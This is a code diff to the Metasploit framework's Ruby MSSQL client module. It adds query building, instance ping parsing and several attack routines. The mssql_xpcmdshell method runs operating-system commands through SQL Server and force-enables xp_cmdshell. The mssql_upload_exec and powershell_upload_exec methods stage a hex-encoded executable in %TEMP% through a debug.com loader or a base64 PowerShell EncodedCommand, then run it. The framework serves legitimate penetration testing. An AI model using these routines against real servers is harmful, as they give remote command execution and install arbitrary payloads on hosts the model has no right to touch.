@@ -1,6 +1,8 @@
 require 'metasploit/framework/tcp/client'
 require 'metasploit/framework/mssql/tdssslproxy'
 require 'metasploit/framework/mssql/base'
+require 'msf/core/exploit'
+require 'msf/core/exploit/remote'
 
 module Metasploit
   module Framework
@@ -8,8 +10,43 @@ module Metasploit
 
       module Client
         extend ActiveSupport::Concern
+
         include Metasploit::Framework::Tcp::Client
         include Metasploit::Framework::MSSQL::Base
+        include Msf::Exploit::Remote::MSSQL_COMMANDS
+        include Msf::Exploit::Remote::Udp
+        include Msf::Exploit::Remote::NTLM::Client
+        include Msf::Exploit::Remote::Kerberos::Ticket::Storage
+        include Msf::Exploit::Remote::Kerberos::ServiceAuthenticator::Options
+
+        attr_accessor :tdsencryption
+        attr_accessor :sock
+        attr_accessor :auth
+
+        # @!attribute max_send_size
+        #   @return [Integer] The max size of the data to encapsulate in a single packet
+        attr_accessor :max_send_size
+        # @!attribute send_delay
+        #   @return [Integer] The delay between sending packets
+        attr_accessor :send_delay
+
+        included do
+          include ActiveModel::Validations
+          validates :max_send_size,
+                    presence: true,
+                    numericality: {
+                        only_integer:             true,
+                        greater_than_or_equal_to: 0
+                    }
+
+          validates :send_delay,
+                    presence: true,
+                    numericality: {
+                        only_integer:             true,
+                        greater_than_or_equal_to: 0
+                    }
+
+        end
 
         #
         # This method connects to the server over TCP and attempts
@@ -21,7 +58,6 @@ module Metasploit
           disconnect if self.sock
           connect
           mssql_prelogin
-
           if auth == Msf::Exploit::Remote::AuthOption::KERBEROS
             idx = 0
             pkt = ''
@@ -363,6 +399,10 @@ module Metasploit
           info[:login_ack] ? true : false
         end
 
+        #do we still need this?
+        def mssql_login_datastore(db='')
+          mssql_login(datastore['USERNAME'], datastore['PASSWORD'], db)
+        end
         #
         #this method send a prelogin packet and check if encryption is off
         #
@@ -504,11 +544,212 @@ module Metasploit
           tdsproxy.send_recv(req)
         end
 
+        def mssql_print_reply(info)
+
+          print_status("SQL Query: #{info[:sql]}")
+      
+          if info[:done] && info[:done][:rows].to_i > 0
+            print_status("Row Count: #{info[:done][:rows]} (Status: #{info[:done][:status]} Command: #{info[:done][:cmd]})")
+          end
+      
+          if info[:errors] && !info[:errors].empty?
+            info[:errors].each do |err|
+              print_error(err)
+            end
+          end
+      
+          if info[:rows] && !info[:rows].empty?
+      
+            tbl = Rex::Text::Table.new(
+              'Indent'    => 1,
+              'Header'    => "",
+              'Columns'   => info[:colnames],
+              'SortIndex' => -1
+            )
+      
+            info[:rows].each do |row|
+              tbl << row
+            end
+      
+            print_line(tbl.to_s)
+          end
+        end
+
+        def mssql_query(sqla, doprint=false, opts={})
+          info = { :sql => sqla }
+      
+          opts[:timeout] ||= 15
+      
+          pkts = []
+          idx  = 0
+      
+          bsize = 4096 - 8
+          chan  = 0
+      
+          @cnt ||= 0
+          @cnt += 1
+      
+          sql = Rex::Text.to_unicode(sqla)
+          while(idx < sql.length)
+            buf = sql[idx, bsize]
+            flg = buf.length < bsize ? "\x01" : "\x00"
+            pkts << "\x01" + flg + [buf.length + 8].pack('n') + [chan].pack('n') + [@cnt].pack('C') + "\x00" + buf
+            idx += bsize
+      
+          end
+      
+          resp = mssql_send_recv(pkts.join, opts[:timeout])
+          mssql_parse_reply(resp, info)
+          mssql_print_reply(info) if doprint
+          info
+        end
+
+        def mssql_ping(timeout=5)
+          data = { }
+      
+          ping_sock = Rex::Socket::Udp.create(
+            'PeerHost'  => rhost,
+            'PeerPort'  => 1434,
+            'Context'   =>
+              {
+                'Msf'        => framework,
+                'MsfExploit' => self,
+              })
+      
+          ping_sock.put("\x02")
+          resp, _saddr, _sport = ping_sock.recvfrom(65535, timeout)
+          ping_sock.close
+      
+          return data if not resp
+          return data if resp.length == 0
+      
+          return mssql_ping_parse(resp)
+        end
+
+        def mssql_ping_parse(data)
+          res = []
+          var = nil
+          idx = data.index('ServerName')
+          return res if not idx
+          sdata = data[idx, (data.length - 1)]
+      
+          instances = sdata.split(';;')
+          instances.each do |instance|
+            rinst = {}
+            instance.split(';').each do |d|
+              if (not var)
+                var = d
+              else
+                if (var.length > 0)
+                  rinst[var] = d
+                  var = nil
+                end
+              end
+            end
+            res << rinst
+          end
+      
+          return res
+        end
+
+        def mssql_xpcmdshell(cmd, doprint=false, opts={})
+          force_enable = false
+          begin
+            res = mssql_query("EXEC master..xp_cmdshell '#{cmd}'", false, opts)
+            if res[:errors] && !res[:errors].empty?
+              if res[:errors].join =~ /xp_cmdshell/
+                if force_enable
+                  print_error("The xp_cmdshell procedure is not available and could not be enabled")
+                  raise RuntimeError, "Failed to execute command"
+                else
+                  print_status("The server may have xp_cmdshell disabled, trying to enable it...")
+                  mssql_query(mssql_xpcmdshell_enable())
+                  raise RuntimeError, "xp_cmdshell disabled"
+                end
+              end
+            end
+      
+            mssql_print_reply(res) if doprint
+      
+            return res
+      
+          rescue RuntimeError => e
+            if e.to_s =~ /xp_cmdshell disabled/
+              force_enable = true
+              retry
+            end
+            raise e
+          end
+        end
+
+        def mssql_upload_exec(exe, debug=false)
+          hex = exe.unpack("H*")[0]
+      
+          var_bypass  = rand_text_alpha(8)
+          var_payload = rand_text_alpha(8)
+      
+          print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+          print_status("Writing the debug.com loader to the disk...")
+          h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
+          h2b.gsub!(/KemneE3N/, "%TEMP%\\#{var_bypass}")
+          h2b.split(/\n/).each do |line|
+            mssql_xpcmdshell("#{line}", false)
+          end
+      
+          print_status("Converting the debug script to an executable...")
+          mssql_xpcmdshell("cmd.exe /c cd %TEMP% && cd %TEMP% && debug < %TEMP%\\#{var_bypass}", debug)
+          mssql_xpcmdshell("cmd.exe /c move %TEMP%\\#{var_bypass}.bin %TEMP%\\#{var_bypass}.exe", debug)
+      
+          print_status("Uploading the payload, please be patient...")
+          idx = 0
+          cnt = 500
+          while(idx < hex.length - 1)
+            mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]}>>%TEMP%\\#{var_payload}", false)
+            idx += cnt
+          end
+      
+          print_status("Converting the encoded payload...")
+          mssql_xpcmdshell("%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}", debug)
+          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_bypass}.exe", debug)
+          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+      
+          print_status("Executing the payload...")
+          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+        end
+
+        def powershell_upload_exec(exe, debug=false)
+
+          # hex converter
+          hex = exe.unpack("H*")[0]
+          # create random alpha 8 character names
+          #var_bypass  = rand_text_alpha(8)
+          var_payload = rand_text_alpha(8)
+          print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
+          # our payload converter, grabs a hex file and converts it to binary for us through powershell
+          h2b = "$s = gc 'C:\\Windows\\Temp\\#{var_payload}';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\#{var_payload}.exe',$b)"
+          h2b_unicode=Rex::Text.to_unicode(h2b)
+          # base64 encode it, this allows us to perform execution through powershell without registry changes
+          h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
+          print_status("Uploading the payload #{var_payload}, please be patient...")
+          idx = 0
+          cnt = 500
+          while(idx < hex.length - 1)
+            mssql_xpcmdshell("cmd.exe /c echo #{hex[idx, cnt]}>>%TEMP%\\#{var_payload}", false)
+            idx += cnt
+          end
+          print_status("Converting the payload utilizing PowerShell EncodedCommand...")
+          mssql_xpcmdshell("powershell -EncodedCommand #{h2b_encoded}", debug)
+          mssql_xpcmdshell("cmd.exe /c del %TEMP%\\#{var_payload}", debug)
+          print_status("Executing the payload...")
+          mssql_xpcmdshell("%TEMP%\\#{var_payload}.exe", false, {:timeout => 1})
+          print_status("Be sure to cleanup #{var_payload}.exe...")
+        end
+
         protected
 
-        def auth
-          raise NotImplementedError
-        end
+        # def auth
+        #   raise NotImplementedError
+        # end
 
         def domain_controller_rhost
           raise NotImplementedError
